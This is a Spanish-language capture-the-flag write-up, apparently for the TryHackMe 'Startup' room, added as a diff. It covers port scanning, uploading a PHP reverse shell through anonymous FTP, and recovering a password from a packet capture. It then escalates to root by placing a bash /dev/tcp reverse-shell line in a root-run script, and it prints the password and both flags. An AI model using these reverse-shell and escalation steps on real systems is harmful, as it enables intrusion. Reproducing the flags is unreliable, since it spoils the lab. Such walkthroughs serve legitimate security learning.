@@ -1,0 +1,106 @@
+Tryhackme
+startup
+
+nmap
+nmap -p- -sS -sC -sV --open --min-rate 2500 -vvv -n -Pn 10.10.15.189 -oN nmap
+
+• 21/tcp open ftp syn-ack ttl 64 vsftpd 3.0.3
+    • ftp-anon: Anonymous FTP login allowed (FTP code 230)
+• 22/tcp open ssh syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+• 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
+
+gobuster
+
+• /files
+
+Podemos ver que en el puerto 21 FTP tenemos un login anónimo que no requiere contraseña. Ingresaremos.
+Dentro de FTP anónimo encontramos 2 archivos interesantes:
+
+> important.jpg
+> notice.txt
+
+Los archivos no tienen nada interesante más que un meme, por lo tanto procederemos a subir una reverse shell desde mi PC a este servidor FTP para entrar luego por Netcat.
+
+> Creamos una reverse shell.php con PentestMonkey
+> ftp 10.10.15.189
+    > user: anonymous
+    > pass: (sin contraseña)
+> put reverseshell.php
+
+Luego de subir la reverse shell, la activamos desde "10.10.15.189/files/ftp" y ya estamos dentro con Netcat.
+
+> nc -nlvp 443
+    > whoami
+        > www-data
+
+Hacemos el tratamiento de la TTY:
+
+> script /dev/null -c bash
+> (control z)
+> stty raw -echo; fg
+> reset xterm
+> export TERM=xterm
+> export SHELL=bash
+
+Después de hacer el tratamiento de la TTY, buscamos archivos, pero como www-data no tenemos muchas opciones, pero encontramos una carpeta llamada "incidents" en donde tenemos un archivo "suspicious.pcapng", procedemos a descargarlo.
+
+> cd incidents
+> python3 -m http.server 5000
+**el puerto 5000 no nos exige permisos para manipular**
+
+Luego ingresamos a la página en el puerto 5000 "10.10.15.189:5000" y descargamos el archivo. Vemos que es un archivo de Wireshark.
+
+Buscando entre los datos de Wireshark, encontramos que www-data intentó colocar una contraseña:
+
+> c4ntg3t3n0ughsp1c3
+
+Otra manera más fácil hubiese sido:
+
+> strings suspicious.pcapng
+
+Anteriormente, dentro del puerto FTP anónimo vimos un usuario "lennie", por lo tanto ahora ingresaremos por el servicio SSH alojado en el puerto 22.
+
+> ssh lennie@10.10.114.173
+> pass: c4ntg3t3n0ughsp1c3
+
+Estamos dentro y encontramos la flag de usuario.
+
+> cat user.txt
+    > THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
+
+De nuevo hacemos el tratamiento de la TTY
+
+> script /dev/null -c bash
+
+Ahora procedemos a buscar cómo subir a root, para esto tenemos que buscar desde la raíz para ver qué se ejecuta como root. Buscando encontramos la carpeta "scripts" dentro de lennie.
+
+> cd lennie
+> ls
+    > planner.sh
+    > startup_list.txt
+> ls -l
+    > -rwxr-xr-x 1 root root 77 Nov 12 2020 planner.sh
+    > -rw-r--r-- 1 root root 1 Oct 24 00:33 startup_list.txt
+
+Vemos que se ejecuta como root "planner.sh", procedemos a leerlo.
+
+> cat planner.sh
+    #!/bin/bash
+echo $LIST > /home/lennie/scripts/startup_list.txt
+/etc/print.sh
+
+Vemos que se ejecuta el script de "print.sh".
+
+Procedemos a modificar print.sh.
+
+> nano /etc/print.sh
+    > "-c bash 'bash -i >& /dev/tcp/10.18.112.21/443 0>&1'"
+
+El contenido del archivo no tiene importancia. Procedemos a borrarlo y colocar una reverse shell por el puerto 444 para obtener privilegios de root.
+
+> nc -nlvp 444
+
+Establecemos conexión y, en efecto, somos root.
+
+> cat root.txt
+    > THM{f963aaa6a430f210222158ae15c3d76d}
